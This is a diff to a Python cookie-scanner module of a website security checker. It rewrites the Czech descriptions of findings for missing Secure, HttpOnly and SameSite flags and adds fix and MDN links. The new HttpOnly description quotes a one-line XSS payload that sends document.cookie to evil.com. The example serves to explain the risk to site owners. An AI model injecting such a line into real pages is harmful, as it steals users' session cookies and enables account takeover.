@@ -74,9 +74,11 @@ class CookieScanner(BaseScanModule):
             findings.append(Finding(
                 id="cookie-missing-secure",
                 title=f"{len(missing_secure)} cookies bez Secure flagu",
-                description="Cookies bez Secure flagu se odesílají i přes nezabezpečené HTTP spojení. Útočník je může zachytit.",
+                description="Cookies bez Secure flagu se odesílají i přes nezabezpečené HTTP spojení. Útočník na veřejné Wi-Fi může zachytit session cookie a převzít účet uživatele.",
                 severity=Severity.WARNING,
                 category="cookies",
+                fix_url="/guide/#autentizace-sessions",
+                doc_url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#security",
                 detail=_format_cookie_names(missing_secure),
             ))
 
@@ -84,9 +86,11 @@ class CookieScanner(BaseScanModule):
             findings.append(Finding(
                 id="cookie-missing-httponly",
                 title=f"{len(missing_httponly)} cookies bez HttpOnly flagu",
-                description="Cookies bez HttpOnly jsou přístupné přes JavaScript. Při XSS útoku je útočník může ukrást.",
+                description="Cookies bez HttpOnly jsou čitelné přes document.cookie v JavaScriptu. Při XSS útoku stačí jeden řádek kódu: document.location='https://evil.com/?c='+document.cookie",
                 severity=Severity.WARNING,
                 category="cookies",
+                fix_url="/guide/#autentizace-sessions",
+                doc_url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#security",
                 detail=_format_cookie_names(missing_httponly),
             ))
 
@@ -94,9 +98,11 @@ class CookieScanner(BaseScanModule):
             findings.append(Finding(
                 id="cookie-missing-samesite",
                 title=f"{len(missing_samesite)} cookies bez SameSite ochrany",
-                description="Cookies bez SameSite (nebo s SameSite=None) se odesílají i s cross-site požadavky. Zvyšuje riziko CSRF útoku.",
+                description="Cookies bez SameSite se odesílají i z cizích stránek. Útočník vytvoří formulář na svém webu, který odešle POST na váš server — prohlížeč přiloží cookies a akce proběhne za přihlášeného uživatele (CSRF).",
                 severity=Severity.WARNING,
                 category="cookies",
+                fix_url="/guide/#autentizace-sessions",
+                doc_url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#samesite_attribute",
                 detail=_format_cookie_names(missing_samesite),
             ))
 
